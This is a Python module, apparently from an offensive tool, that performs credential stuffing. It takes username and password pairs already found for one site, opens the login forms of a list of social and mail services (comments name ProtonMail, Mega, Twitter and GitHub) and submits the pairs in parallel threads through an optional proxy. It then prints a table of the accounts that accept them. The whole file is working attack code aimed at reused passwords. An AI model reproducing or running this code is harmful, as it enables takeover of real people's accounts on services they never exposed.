
from core import utils, tbrowser, actions
from modules import loginbrute
import data, threading

# BUG [x] ReAuth: Can't find login form at https://mail.protonmail.com/login
	#[x] ReAuth: Can't find login form at https://mega.nz/login
# BUG: no control matching name 'session[password]' at https://mobile.twitter.com/login
# BUG: no control matching name 'password' at https://github.com/login


try:
	from Queue import Queue
except ImportError:
	from queue import Queue

def do_job(jobs):
	for job in jobs:
		job.start()

	for job in jobs:
		job.join()
		
def submit(optionURL, tryCreds, optionProxy, optionVerbose, result):

	try:
		proc = tbrowser.startBrowser()
		proc.addheaders = [('User-Agent', tbrowser.useragent())]

		utils.printf("[+] Checking %s" %(optionURL))

		proc.open(optionURL)
		loginInfo = tbrowser.parseLoginForm(proc.forms())

	except Exception as err:
		if optionVerbose:
			utils.printf("[x] ReAuth: %s at %s" %(err, optionURL), "bad")
		

	if not loginInfo:
		if optionVerbose:
			utils.printf("[x] ReAuth: Can't find login form at %s" %(optionURL), "bad")
	else:
		try:
			loginbrute.submit(
				optionURL, tryCreds[::-1], optionProxy, # Reverse username + password. Dynamic submit in loginbrute
				"", optionVerbose, loginInfo, result, True # No key false by default, result now should be url
			)
		except Exception as err:
			if optionVerbose:
				utils.printf("[x] ReAuth: Submitting error for %s" %(err), "bad")

def run(checkedURL, creds, optionThreads, optionProxy, optionVerbose):
	social_urls = data.social_urls().replace("\t", "").split("\n")

	for url in social_urls:
		# BUG double_free() 
		if checkedURL in url:
			social_urls.remove(url)


	result = Queue()
	workers = []

	try:
		for tryCreds in creds:
			for url in social_urls:
				if actions.size_o(workers) == optionThreads:
					do_job(workers)
					del workers[:]

				worker = threading.Thread(
					target = submit,
					args = (url, tryCreds, optionProxy, optionVerbose, result)
				)

				worker.daemon = True
				workers.append(worker)


		do_job(workers)
		del workers[:]
		
	
	except KeyboardInterrupt:
		utils.die("[x] Terminated by user!", "KeyboardInterrupt")

	except SystemExit:
		utils.die("[x] Terminated by system!", "SystemExit")
	
	except Exception as err:
		utils.die("[x] ReAuth: Runtime error", err)
				
	finally:
		result = list(result.queue)

		if actions.size_o(result) == 0:
			utils.printf("[-] No extra valid password found", "bad")
		else:
			utils.print_table(("Target", "Username", "Password"), *result)